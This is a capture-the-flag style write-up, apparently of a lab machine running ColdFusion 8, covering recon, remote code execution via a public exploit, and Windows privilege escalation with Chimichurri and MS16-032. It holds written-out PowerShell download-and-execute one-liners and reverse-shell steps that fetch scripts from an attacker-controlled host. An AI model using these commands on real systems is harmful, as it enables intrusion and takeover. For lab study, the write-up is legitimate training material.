# Writeup
## Recon
- nmapAutomator.sh

![30ca04ed80995b306eaa8bf44133c93c.png](../../_resources/30ca04ed80995b306eaa8bf44133c93c-1.png)

- Navigating to the 10.10.10.11:8500 on web browser

![d42cf0958eb96e6984cbf52e12be408c.png](../../_resources/d42cf0958eb96e6984cbf52e12be408c-1.png)

- ColdFusion 8 Administrator panel

![4b5a7158631b4654912b48a98c4d5c83.png](../../_resources/4b5a7158631b4654912b48a98c4d5c83-1.png)


## Initial Access
- Using exploit-db RCE `50057.py` for ColdFusion 8 exploit and modifying parameters

![c4c1bf4e9c206634014fd38301bee7cc.png](../../_resources/c4c1bf4e9c206634014fd38301bee7cc-1.png)

- Running the script with `python3 50057.py` and getting RCE

![42b4ae924009b4335c98a24a67a8ca9f.png](../../_resources/42b4ae924009b4335c98a24a67a8ca9f-1.png)

- User flag done!

![628d1598f735d4f733b9385f5e55e83d.png](../../_resources/628d1598f735d4f733b9385f5e55e83d-1.png)


## Privesc
Got PowerShell reverse shell with nishang's `Invoke-PowerShellTcp.ps1` (added one line at the end specifying the port and ip, see examples included in the script)

- Listening on port `5555` with `rlwrap` and `nc`

```
rlwrap nc -nvlp 5555
```

- Downloading and executing the nishang PowerShell script (after hosting the file on Kali with Python HTTP server)

```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4:8080/Invoke-PowerShellTcp.ps1');" 
```

![395d2d9e91654e377a77cb6165927aca.png](../../_resources/395d2d9e91654e377a77cb6165927aca-1.png)

- Downloading and executing Sherlock.ps1 to find vulnerabilities for privesc (Append Find-AllVulns at the end of the script on a newline)

```
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4:8080/Sherlock.ps1');
```

![ad72e1d58b4079990ce63f844e7499df.png](../../_resources/ad72e1d58b4079990ce63f844e7499df-1.png)

![25c347a3726014ba2c526a437bb3da7d.png](../../_resources/25c347a3726014ba2c526a437bb3da7d-1.png)

![b1fdab763d2a28a8ac1e25a48b2cce99.png](../../_resources/b1fdab763d2a28a8ac1e25a48b2cce99-1.png)

- Running `systeminfo`

![1e7a6f32acc0f972c64a2aac2e8488ee.png](../../_resources/1e7a6f32acc0f972c64a2aac2e8488ee-1.png)

- At this point, MS16-032 seemed promising, but it was failing so I had to look for other ways to get privesc. 

- Enter MS10-059 and Chimichurri.exe

- First, download Chimichurri from Powershell (after hosting it in Kali)

```
(New-Object Net.WebClient).DownloadFile('http://10.10.14.4:8080/Chimichurri.exe','c:\Users\tolis\Chimichurri.exe')
```

- Then, run it with the ip and port arguments after starting a listener

![47d91995d9e5eeedcac47011686cf466.png](../../_resources/47d91995d9e5eeedcac47011686cf466-1.png)

![7361fc0b29ecd06d8ce2d8a16f2b44e3.png](../../_resources/7361fc0b29ecd06d8ce2d8a16f2b44e3-1.png)

- And voila!

![5abec90cb537f3cb0c1bb0cfe165ae20.png](../../_resources/5abec90cb537f3cb0c1bb0cfe165ae20-1.png)

- Root flag done!

![982b6d4fd4af39f3354e212c3640d57e.png](../../_resources/982b6d4fd4af39f3354e212c3640d57e-1.png)


## Privesc (failed attempt)
- Now we will need to upgrade the primitive cmd shell to a meterpreter session. To do this, we will need `unicorn.py` and metasploit.

- Generate a payload and listener script for a windows reverse tcp meterpreter shell: 

![b0699ef10e334a357d6e9bb01edc360c.png](../../_resources/b0699ef10e334a357d6e9bb01edc360c-1.png)

- Copy the `powershell-attack.txt` to `attack.html` (or whatever extension) and delete the powershell command up until the first double quote, then delete the double quote at the end of the payload. We don't need this part because we will be running powershell from the basic shell that we have to download and execute the payload.
- Note: there may be different parts in the attack file. Make sure to delete comments and any part that is NOT the unicorn payload.

- Open a metasploit listener by running: 

```
msfconsole -r unicorn.rc
```

![86dd416d9aa42614bb3d011102610117.png](../../_resources/86dd416d9aa42614bb3d011102610117-1.png)

- Put up a Python HTTP server in the directory where the attack.html is located and run the Powershell command on the basic shell to execute the payload.

![52c6ae341c68185044c3ed67b0f104ce.png](../../_resources/52c6ae341c68185044c3ed67b0f104ce-1.png)

```
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4:8080/attack.html');
```


## Privesc (failed attempt 2)
- Using the Empire module_source `Invoke-MS16032.ps1` and adding the following line to the end of the file: 

```
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.4:8080/shell.ps1')"
```

- Note that `shell.ps1` will run an additional reverse shell (using the source code `Invoke-PowerShellTcp.ps1`) with a different port (and thus needs a separate listener). This shell will be SYSTEM-level because Invoke-MS16032 elevates the privileges first. 

- Path is: Download and execute `Invoke-MS16032` which downloads and executes `shell.ps1` with elevated privileges and opens a reverse shell back to Kali